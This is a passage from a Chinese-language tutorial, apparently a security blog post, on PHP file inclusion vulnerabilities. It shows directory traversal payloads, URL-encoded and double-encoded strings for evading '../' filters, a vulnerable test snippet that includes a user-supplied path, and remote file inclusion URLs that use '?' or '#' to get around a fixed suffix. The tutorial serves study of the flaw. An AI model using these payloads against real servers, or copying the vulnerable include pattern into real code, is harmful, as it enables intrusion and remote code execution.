/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">目录遍历</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">这个最简单了，简要的提一下。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">现在在/var/log/test.txt文件中有php代码</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">&lt;?php phpinfo();?&gt;</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，则利用</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">../</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">可以进行目录遍历，比如我们尝试访问：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include.php?file=../../log/test.txt</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/18.png" height="247" width="1158"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">编码绕过</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">服务器端常常会对于</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">../</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用url编码
</span></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">../
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%2e%2e%2f</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..%2f</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%2e%2e/  </span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..\
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%2e%2e%5c</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..%5c</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%2e%2e\</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">二次编码
</span></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">../
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%252e%252e%252f</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..\
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%252e%252e%255c</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">容器/服务器的编码方式
</span></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">../
</span></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..%c0%af
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">注：</span><a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">Why does Directory traversal attack %C0%AF work?</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">%c0%ae%c0%ae/
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">Apache Tomcat Directory Traversal</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="list-style: circle;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..\
</span></div><div style="list-style: circle;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">..%c1%9c</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">指定后缀</span></h2><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">接着考虑指定后缀的情况。测试代码:</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    $file = $_GET[</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'file'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">];</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;"> $file.</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'/test/test.php'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">;</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">URL</span></h3><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">url格式</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势一：query（？）</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=http://remoteaddr/remoteinfo.txt?</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">则包含的文件为 </span><a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">http://remoteaddr/remoteinfo.txt?/test/test.php</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">问号后面的部分</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">/test/test.php</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，也就是指定的后缀被当作query从而被绕过。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/19.png" height="227" width="1206"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势二：fragment（#）</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=http://remoteaddr/remoteinfo.txt%23</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">则包含的文件为 </span><a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">http://remoteaddr/remoteinfo.txt#/test/test.php</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">问号后面的部分</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 